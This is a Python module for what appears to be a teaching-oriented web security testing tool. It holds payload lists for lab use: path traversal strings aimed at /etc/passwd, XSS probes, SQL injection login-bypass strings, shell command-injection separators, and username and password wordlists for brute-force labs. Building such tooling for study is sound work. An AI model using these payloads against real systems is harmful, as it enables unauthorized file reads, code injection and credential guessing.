"""
A small, curated payload library — the strings a learner reaches for over and
over but may not remember. Surfaced two ways: a "Load list" picker above each
Intruder payload panel, and an "Insert payload" submenu in the request editors.

Each list carries a one-line description so the library doubles as a teaching
reference for what the payloads probe. Kept headless (no Qt) and tested directly.
"""
from __future__ import annotations

from dataclasses import dataclass, field
from typing import Optional


@dataclass
class PayloadList:
    key: str
    name: str
    description: str
    payloads: list[str] = field(default_factory=list)


LISTS: list[PayloadList] = [
    PayloadList(
        "path-traversal", "Path traversal",
        "Climb out of a directory to read arbitrary files (target /etc/passwd).",
        [
            "../../../etc/passwd",
            "../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "/etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../etc/passwd%00.png",
        ],
    ),
    PayloadList(
        "xss-probes", "XSS probes",
        "Detect where input reflects and whether it executes as HTML/JS.",
        [
            "<script>alert(1)</script>",
            "\"><script>alert(1)</script>",
            "'><img src=x onerror=alert(1)>",
            "<img src=x onerror=alert(document.domain)>",
            "<svg onload=alert(1)>",
            "javascript:alert(1)",
            "\"onmouseover=\"alert(1)",
            "{{7*7}}",
        ],
    ),
    PayloadList(
        "sqli-auth-bypass", "SQLi auth bypass",
        "Classic login-bypass and boolean payloads for SQL injection.",
        [
            "' OR '1'='1",
            "' OR 1=1--",
            "admin'--",
            "admin'#",
            "' OR '1'='1'--",
            "\" OR \"\"=\"",
            "') OR ('1'='1",
            "' UNION SELECT NULL--",
            "1' ORDER BY 1--",
        ],
    ),
    PayloadList(
        "common-usernames", "Common usernames",
        "Username wordlist for credential/enumeration labs.",
        ["admin", "administrator", "root", "carlos", "wiener", "user", "test", "guest"],
    ),
    PayloadList(
        "common-passwords", "Common passwords",
        "Short password wordlist for brute-force labs (PortSwigger uses these).",
        [
            "peter", "carlos", "password", "123456", "letmein", "qwerty",
            "monkey", "hunter2", "secret", "admin",
        ],
    ),
    PayloadList(
        "cmd-injection", "Command injection separators",
        "Shell metacharacters to chain an injected OS command.",
        [
            "; id", "| id", "|| id", "& id", "&& id",
            "`id`", "$(id)", "%0a id", "; sleep 10",
        ],
    ),
]

_BY_KEY = {pl.key: pl for pl in LISTS}


def names() -> list[tuple[str, str]]:
    """(key, name) pairs for populating a picker."""
    return [(pl.key, pl.name) for pl in LISTS]


def get(key: str) -> Optional[PayloadList]:
    return _BY_KEY.get(key)


def payloads_for(key: str) -> list[str]:
    pl = _BY_KEY.get(key)
    return list(pl.payloads) if pl else []
